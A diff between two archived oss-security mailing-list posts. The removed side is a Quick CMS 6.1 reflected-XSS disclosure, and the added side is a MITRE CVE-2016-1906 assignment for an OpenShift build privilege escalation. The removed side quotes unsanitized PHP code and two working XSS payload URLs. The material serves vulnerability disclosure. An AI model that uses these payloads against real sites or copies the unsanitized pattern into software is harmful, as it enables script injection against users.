@@ -1,62 +1,51 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/01/19/7
-Message-ID: <CADLX=aFcG44oDaW57ZtFHm3D8e-aqhfRdMU=c0uaKLUCeXjJow@mail.gmail.com>
-Date: Tue, 19 Jan 2016 16:20:18 +0530
-From: Rahul Pratap Singh <techno.rps@...il.com>
-To: oss-security@...ts.openwall.com
-Subject: CVE Request: Quick CMS v 6.1 XSS Vulnerability
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/01/15/3
+Message-Id: <20160115035720.417C86C01CE@smtpvmsrv1.mitre.org>
+Date: Thu, 14 Jan 2016 22:57:20 -0500 (EST)
+From: cve-assign@...re.org
+To: kseifried@...hat.com
+Cc: cve-assign@...re.org, oss-security@...ts.openwall.com
+Subject: Re: CVE request for Kubernetes api server: build config to a strategy that isn't allowed by policy
 Content-Type: text/plain; charset=utf-8
 
-## FULL DISCLOSURE
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
 
-#Product    : Quick CMS
-#Version    : 6.1
-#Home page Link  : http://opensolution.org/home.html
-#Date        : 19/Jan/2016
+> CVE request (one is the problem, the other the fix):
+> 
+> https://github.com/openshift/origin/issues/6556
+> https://github.com/openshift/origin/pull/6576
+> 
+> You can modify a build so that it escalates privileges when built, you
+> can't build it yourself (that fails) but if the imagestream trigger is used
+> then it would build and you'd have escalated privileges.
 
-XSS Vulnerability:
+>> pkg/build/admission/admission.go
+>> 
+>> -  Handler: admission.NewHandler(admission.Create),
+>> +  Handler: admission.NewHandler(admission.Create, admission.Update),
 
-----------------------------------------
-Description:
-----------------------------------------
- "sLangEdit" and "sSort" parameters are not sanitized that leads to
-Reflected XSS.
+Use CVE-2016-1906.
 
-----------------------------------------
-Vulnerable Code:
-----------------------------------------
-File Name: languages.php
+- -- 
+CVE assignment team, MITRE CVE Numbering Authority
+M/S M300
+202 Burlington Road, Bedford, MA 01730 USA
+[ PGP key available through http://cve.mitre.org/cve/request_id.html ]
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
 
-Found at line:23
-<h1><?php echo $lang['Languages'].( isset( $_GET['sLangEdit'] ) ? '
-'.$_GET['sLangEdit'] : null ); ?></h1>
-
-File Name: pages.php
-
-Found at line:49
-<form action="?p=pages<?php if( isset( $_GET['sSort'] ) ) echo
-'&amp;sSort='.$_GET['sSort']; ?>" name="form" method="post"
-class="main-form">
-
-----------------------------------------
-Exploit:
-----------------------------------------
-localhost/Quick.Cms_v6.1-en/admin.php?p=languages&sLangEdit=</h1><script>alert("XSS")</script><h1>
-
-localhost/Quick.Cms_v6.1-en/admin.php?p=pages&sSort="><img%20src=x%20onerror=confirm(1)><!--
-
-----------------------------------------
-POC:
-----------------------------------------
-https://0x62626262.files.wordpress.com/2016/01/quick-cms-v6-1xsspoc.png
-https://0x62626262.files.wordpress.com/2016/01/quick-cms-v6-1xsspoc2.png
-
-
-Disclosure Timeline:
-Tried to contact vendor via email  : 14/1/2016 ( email bounce back)
-Tried to contact vendor via forum : 18/1/2016 (thread deleted, no response)
-Public Disclosure: 19/1/2016
-
-Pub ref:
-https://0x62626262.wordpress.com/2016/01/19/quick-cms-v-6-1-xss-vulnerability
-
+iQIcBAEBCAAGBQJWmGzAAAoJEL54rhJi8gl5RsoP/0XiA5NuaONohleODumNEtnk
+vBX0Qs7kI3OngNJl1CVodLum+1dO90ngGwRpvVb7LgFnX780f/buOYlKeLOhHOdz
+MxjqjkvL9krDTcOXiTc2IUcYchLJCeVmxCHlDA6dzvhNukThKidbmKOWCQkXYJXE
+q+75TzXB14zxl4zTTjnw0Q5H1mI0itNbPby1+wTWI1Tq99Wximw4c729VFj161eW
+OSnqNQk44j6FlDp6QINoYM+njHphcl/1rJm9J+Qfx9s0Z06Flaig7q89FQ5F5WFO
+W2hwAuFhbo+mk1utxzCk+Z4Uh2dUOW86WFrGLd9nx/W4GYrkRekkdSyx8aBKPwy4
+aQhV/cZy4IrKd3WJz2J+ivrbbpg1+UwGnZd8oUyLhw+9GoGyY8it9C3iNgTQEbPL
+995s2wPIWsZAVAUX/lb11x1NqfDJ5JKR3UJr4MypEaXyz2nM/A/eDEMyEaJkfrzj
+/rlmuCeQLwZZ70I+ELz65qPQFI14lFDGQN6QNVL0NM6fNqUol6e85GKH6nuAiuJY
+htOPFSAEaQ4Of92gj1V15o6ZqlGfr8LApkZIadqmFlATSijn3aZ/KB85Pl3Y+vdf
+JXTkuC+aVKoUvnP4RCk4wbxEwEyeSix1KsHfpb+8nozvy/fmdlA3SRfJTUTtyakw
+3KIccaubTIANgI7hO226
+=riuw
+-----END PGP SIGNATURE-----
